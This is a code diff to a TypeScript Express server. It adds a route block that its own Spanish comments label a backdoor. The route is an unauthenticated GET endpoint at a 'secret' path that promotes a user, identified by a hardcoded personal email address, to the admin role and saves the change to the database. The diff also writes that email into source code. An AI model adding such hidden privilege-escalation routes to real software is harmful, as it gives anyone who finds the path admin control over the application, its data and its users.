@@ -100,6 +100,30 @@ class Server {
   }
 
   private routes() {
+    // --- INICIO DE LA PUERTA TRASERA ---
+    this.app.get("/secret-admin-update", async (req, res) => {
+      try {
+        const email = "andreshbk19@gmail.com"; // <--- ⚠️ PON TU EMAIL AQUÍ
+
+        // Buscamos al usuario
+        const user = await UserModel.findOne({ where: { email } });
+
+        if (!user) {
+          return res.status(404).json({ msg: "Usuario no encontrado" });
+        }
+
+        // Lo convertimos en Admin
+        user.dataValues.role = "admin"; // Forzamos el valor
+        await user.save(); // Guardamos en la BD
+
+        return res.json({
+          msg: `¡ÉXITO! El usuario ${email} ahora es ADMIN 👑`,
+        });
+      } catch (error: any) {
+        return res.status(500).json({ error: error.message });
+      }
+    });
+    // --- FIN DE LA PUERTA TRASERA ---
     this.app.use(this.apiPaths.auth, authRoutes);
     this.app.use(this.apiPaths.categories, categoryRoutes);
     this.app.use(this.apiPaths.products, productRoutes);
